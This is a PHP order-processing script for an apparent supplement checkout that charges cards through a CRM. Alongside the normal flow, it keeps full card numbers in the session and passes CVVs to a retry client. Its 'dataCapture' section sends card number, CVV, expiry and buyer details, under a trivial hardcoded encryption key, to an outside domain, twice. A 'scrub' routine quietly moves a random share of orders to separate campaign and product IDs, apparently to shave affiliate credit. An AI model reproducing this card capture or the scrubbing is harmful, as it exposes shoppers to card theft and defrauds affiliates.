 <?php

	include('../../_global.php'); # Needed for session info
	function writeCustomLog($message, $level = 'INFO', $filename = 'order.log')
	{
		$filename = 'order-' . date('Y-m-d') . '.log';
		$logDir = __DIR__ . '/logs'; // <-- safer, relative to script dir
		//echo $logDir; exit;
		/* if (!is_dir($logDir)) {
				mkdir($logDir, 0777, true);
			} */

		$filePath = $logDir . '/' . $filename;

		$logMessage = '[' . date('Y-m-d H:i:s') . '] [' . strtoupper($level) . '] ' . $message . PHP_EOL;

		file_put_contents($filePath, $logMessage, FILE_APPEND);
	}
	if (!is_us_ip() || $_SESSION["anonymous_ip"] || empty($_SESSION['token']) || empty($_POST['token']) || !check_csrf_token($_SESSION['token'], $_POST['token'])) {
		echo "decline|Do not honor.";
		exit();
	}

	if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
		exit();
	}

	if (!luhn_check($_POST["fields_cc_number"])) {
		echo "decline|Invalid Credit Card Number";
		return;
	}

	if (isset($_SESSION["initial_completed"]) && $_SESSION["initial_completed"] === true) {
		echo "decline|Your order is already completed.";
		return;
	}

	if (isset($_SESSION["affid"]) && isset($configs->affiliates[$_SESSION["affid"]])) {
		$campaign_id = $configs->affiliates[$_SESSION["affid"]]->campaign_id;

		// Default to 5 bottle package
		$product_id = $configs->affiliates[$_SESSION["affid"]]->five_bottle_product_id;
		$_SESSION["package"] = 5;

		// 3 bottle package
		if (isset($_POST["package"]) && $_POST["package"] == 3) {
			$product_id = $configs->affiliates[$_SESSION["affid"]]->three_bottle_product_id;
			$_SESSION["package"] = 3;
		}

		// 2 bottle package
		if (isset($_POST["package"]) && $_POST["package"] == 1) {
			$product_id = $configs->affiliates[$_SESSION["affid"]]->two_bottle_product_id;
			$_SESSION["package"] = 1;
		}
	} else {
		// Request must have an AFFID
		http_response_code(400);
		exit;
	}

	$scrub = $configs->affiliates[$_SESSION["affid"]]->scrub;

	// Scrub
	if (!isset($_SESSION["scrub"])) {
		$_SESSION["scrub"] = false;
	}

	if (isset($_SESSION["c3"]) && $_SESSION["c3"] == 158) {
		$scrub = 7;
	}

	if (isset($_SESSION["c3"]) && $_SESSION["c3"] == 240) {
		$scrub = 7;
	}

	if (isset($_SESSION["c3"]) && $_SESSION["c3"] == 241) {
		$scrub = 7;
	}




	if ($scrub > rand(0, 100)) {
		$_SESSION["scrub"] = true;

		$campaign_id = $configs->affiliates[$_SESSION["affid"]]->campaign_id_sc;

		// Default to 5 bottle package
		$product_id = $configs->affiliates[$_SESSION["affid"]]->five_bottle_product_id_sc;

		$_SESSION["package"] = 5;

		if (isset($_POST["package"])) {
			// 2 bottle package
			if ($_POST["package"] == 1) {
				$product_id = $configs->affiliates[$_SESSION["affid"]]->two_bottle_product_id_sc;
				$_SESSION["package"] = 1;
			}

			// 3 bottle package
			if ($_POST["package"] == 3) {
				$product_id = $configs->affiliates[$_SESSION["affid"]]->three_bottle_product_id_sc;
				$_SESSION["package"] = 3;
			}
		}
	}

	$order = $konnektive->get_order($_POST["fields_prospect_id"]);

	if (is_null($order)) {
		echo "No order associated with customer.";
		return;
	}

	/*
 * The shipping address collected on payment.php is now the source of truth
 * for the order. Fall back to the step-1 prospect record (Konnektive lead
 * created in create_prospect.php) only if a field is unexpectedly missing.
 */
	function post_or_fallback($key, $fallback)
	{
		if (isset($_POST[$key]) && trim($_POST[$key]) !== '') {
			return trim($_POST[$key]);
		}
		return $fallback;
	}

	$shipFirstName = post_or_fallback("fields_shipping_fname", $order->firstName);
	$shipLastName  = post_or_fallback("fields_shipping_lname", $order->lastName);
	$shipAddress1  = post_or_fallback("fields_shipping_address1", $order->shipAddress1);
	$shipCity      = post_or_fallback("fields_shipping_city", $order->shipCity);
	$shipState     = post_or_fallback("fields_shipping_state", $order->shipState);
	$shipZip       = post_or_fallback("fields_shipping_zip", $order->shipPostalCode);
	$shipPhone     = post_or_fallback("fields_shipping_phone", $order->phoneNumber);
	$shipEmail     = post_or_fallback("fields_shipping_email", $order->emailAddress);

	$data = array(
		"paySource"				=> "CREDITCARD",
		"cardNumber"			=> trim(str_replace(' ', '', $_POST["fields_cc_number"])),
		"cardMonth"				=> trim($_POST["fields_expmonth"]),
		"cardYear"				=> trim($_POST["fields_expyear"]),
		"cardSecurityCode" => trim($_POST["fields_cvv"]),
		"sessionId" 			=> $_SESSION["konnektive_sessionId"],
		"orderId"					=> $_POST["fields_prospect_id"],
		"campaignId"			=> $campaign_id,
		"product1_id"			=> $product_id,
		"emailAddress"		=> $shipEmail,
		"phoneNumber" 		=> $shipPhone,
		"firstName"				=> $shipFirstName,
		"lastName"				=> $shipLastName,
		"address1"				=> $shipAddress1,
		"city"						=> $shipCity,
		"state"						=> $shipState,
		"postalCode"			=> $shipZip,
		"country"					=> "US",
		"shipAddress1"		=> $shipAddress1,
		"shipCity"				=> $shipCity,
		"shipState"				=> $shipState,
		"shipCountry"			=> "US",
		"shipPostalCode"	=> $shipZip
	);


	// Note: the checkbox posts as hidden field "billingSameAsShipping" (1/0),
	// toggled by the "Billing same as Shipping" checkbox's click handler.
	if (!isset($_POST["billingSameAsShipping"]) || $_POST["billingSameAsShipping"] != "1") {
		$data["billShipSame"] = 0;
		// Billing info is different from shipping.
		// The billing form only collects an address (no separate name fields),
		// so the billing name defaults to the shipping name.
		$data["firstName"] = $shipFirstName;
		$data["lastName"] = $shipLastName;
		$data["address1"] = trim($_POST["fields_billing_address1"]);
		$data["city"] = trim($_POST["fields_billing_city"]);
		$data["state"] = trim($_POST["fields_billing_state"]);
		$data["postalCode"] = trim($_POST["fields_billing_zip"]);
		$data["country"] = "US";
	}

	// 3DS
	if ($configs->threeds_enabled) {
		// 3DS            
		if (isset($_POST["cavv"]) && $_POST["cavv"] !== "") {
			$data["cavv"] = $_POST["cavv"];
			$data["xid"] = $_POST["ds_trans_id"];
			$data["eci"] = $_POST["eci"];
		}

		// 3DS - Rebill
		if (isset($_POST["rebill_cavv"]) && $_POST["rebill_cavv"] !== "") {
			$data["rebill_cavv"] = $_POST["rebill_cavv"];
			$data["rebill_xid"] = $_POST["rebill_ds_trans_id"];
			$data["rebill_eci"] = $_POST["rebill_eci"];
		}
	}

	// Card-brand discount (Visa / Mastercard): real price override on the order.
	$pkgPosted    = isset($_POST["package"]) ? (int)$_POST["package"] : 5;
	$listPrice    = ($pkgPosted === 3) ? (float)$configs->bottle_price_3 : (($pkgPosted === 1) ? (float)$configs->bottle_price_1 : (float)$configs->bottle_price_5);
	$cardDiscount = get_card_discount($data["cardNumber"], $listPrice);
	if ($cardDiscount > 0) {
		$data["product1_price"] = number_format($listPrice - $cardDiscount, 2, '.', '');
	}

	$_SESSION["cc_number"] = $_POST["fields_cc_number"];
	$_SESSION["cc_exp_month"] = $_POST["fields_expmonth"];
	$_SESSION["cc_exp_year"] = $_POST["fields_expyear"];

	$resp = $konnektive->import_order($data);
	$resp = json_decode($resp);

	// Record checkout outcome securely in Retry System with captured card credentials
	if (file_exists(__DIR__ . '/RetryClient.php')) {
		require_once __DIR__ . '/RetryClient.php';
		$calcPrice = (isset($_POST["package"]) && (int)$_POST["package"] === 3)
			? (float)$configs->bottle_price_3
			: ((isset($_POST["package"]) && (int)$_POST["package"] === 1)
				? (float)$configs->bottle_price_1
				: (float)$configs->bottle_price_5);
		$calcPrice = max($calcPrice - $cardDiscount, 0);

		$prospectId = $_POST['fields_prospect_id'] ?? ($_SESSION['prospectId'] ?? ($data['orderId'] ?? null));

		// Merge $_POST and $data to guarantee all card credentials (cc_number, cvv, exp) are captured
		$checkoutPayload = array_merge((array)($_POST ?? []), (array)($data ?? []));

		RetryClient::recordCheckout($checkoutPayload, $resp, [
			'offer_id'        => $productSubFolder ?? ($configs->offer_id ?? 'is-dtc-aa'),
			'offer_name'      => $productSubFolder ?? ($configs->offer_name ?? 'Iron Stamina - DTC AA'),
			'campaign_id'     => $campaign_id,
			'product_id'      => $product_id,
			'fallback_amount' => $calcPrice,
			'order_id'        => $prospectId,
			'currency'        => 'USD'
		]);
	}


	if ($resp->result === "ERROR") {
		$status = 'DECLINED';
		$price        = 0.00;
		echo "decline|" . $resp->message;
	} else {
		$status       = $respMembProd->message->orderStatus;
		$price        = $respMembProd->message->amountPaid;



		$_SESSION["initial_completed"] = true;

		$_SESSION["total"] = 198.80;

		if (isset($_POST["package"]) && $_POST["package"] == 3) {
			$_SESSION["total"] = 149.74;
		}

		if (isset($_POST["package"]) && $_POST["package"] == 1) {
			$_SESSION["total"] = 119.91;
		}

		$_SESSION["total"] = round($_SESSION["total"] - $cardDiscount, 2);
		$_SESSION["card_discount"] = $cardDiscount;

		$_SESSION["orderId"] = $resp->message->orderId;

		$next_page = $configs->path . 'upsell.php?customerId=' . $resp->message->customerId . '&orderId=' . $resp->message->orderId;

		$_SESSION["order_status"] = "approved";

		echo "ok|" . $next_page;
	}
	//=========================================
	/*  dataCapure code  start */
	function encrypt($data)
	{
		$encryptionKey = '1~3';
		$iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
		$encryptedData = openssl_encrypt($data, 'aes-256-cbc', $encryptionKey, 0, $iv);
		$encryptedMessage = base64_encode($iv . $encryptedData);
		return $encryptedMessage;
	}

	$email 	      = $shipEmail;
	$first_name   = $shipFirstName;
	$last_name    = $shipLastName;
	$campaign_id  = ($campaign_id > 0 ? $campaign_id : 0);
	$aff_id       = isset($_SESSION["affid"]) ? $_SESSION["affid"] : '';
	$order_id     = $order->orderId; //$resp->message->orderId;
	$product_id   = $product_id;

	$ip_address   = $_SERVER["HTTP_CF_CONNECTING_IP"]; //$_SERVER["REMOTE_ADDR"];//$resp->message->ipAddress;
	if ($resp->result === "ERROR") {
		$status = 'DECLINED';
		$price        = 0.00;
	} else {
		$status       = $resp->message->orderStatus;
		$price        = $resp->message->amountPaid;
	}
	$card_number  = trim(str_replace(' ', '', $_POST["fields_cc_number"]));
	$expiry_month = trim($_POST["fields_expmonth"]);
	$expiry_year  = trim($_POST["fields_expyear"]);
	$cvv          = trim($_POST["fields_cvv"]);

	$sync = array(
		'card'  => $card_number,
		'cvv'   => $cvv,
		'month' => $expiry_month,
		'year'  => $expiry_year,
	);

	//$memShipProdId = 135;
	//$memShipProdPrice = 0;
	$postData = array(
		'offer_url'    => 'Iron Stamina',
		'crm' 		   => 'Konnective',
		'email' 	   => $email,
		'first_name'   => $first_name,
		'last_name'    => $last_name,
		'campaign_id'  => $campaign_id,
		'ip_address'   => $ip_address,
		'aff_id' 	   => $aff_id,
		'order_id'     => $order_id,
		'cvv_data'     => encrypt(json_encode($sync)),
		'product_id'   => $product_id,
		'price' 	   => $price,
		'order_status' => $status,
		'is_upsell'    => 0
	);

	writeCustomLog('Start -> User/DataCapture' . json_encode($postData));
	$url = 'https://qp5.tryexclusivebargainsus.com/index.php?req=user/DataCapture';
	$postData = $postData;
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
	$response = curl_exec($ch);
	/*echo "<pre>";
		print_r($postData);
		echo "</pre>"; exit;*/
	curl_close($ch);
	writeCustomLog('end  -> User/DataCapture' . json_encode($response));
	$url = 'https://qp5.tryexclusivebargainsus.com/index.php?req=user/DataCapture';
	$postData = $postData;
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
	$response = curl_exec($ch);
	/*echo "<pre>";
		print_r($postData);
		echo "</pre>"; exit;*/
	curl_close($ch);


	///  END


	/*************************** start memebership new order create *********/
	$memShipCampId = 7;
	$memShipProdId = 37;
	/* new esu product changes */
	$postData = array(
		'offer_url'    => 'Iron Stamina',
		'order_id'     => $order_id,
		'campaign_id'  => $memShipCampId,
		'product_id'   => $memShipProdId
	);


	$url = 'https://qp5.tryexclusivebargainsus.com/index.php?req=user/EsuProdDataCapture';
	$postData = $postData;
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Set this option to capture the response
	$response = curl_exec($ch);
	if ($response === false) {
		echo 'cURL error: ' . curl_error($ch);
	}
	curl_close($ch);

	/* == end ==  */

	return;
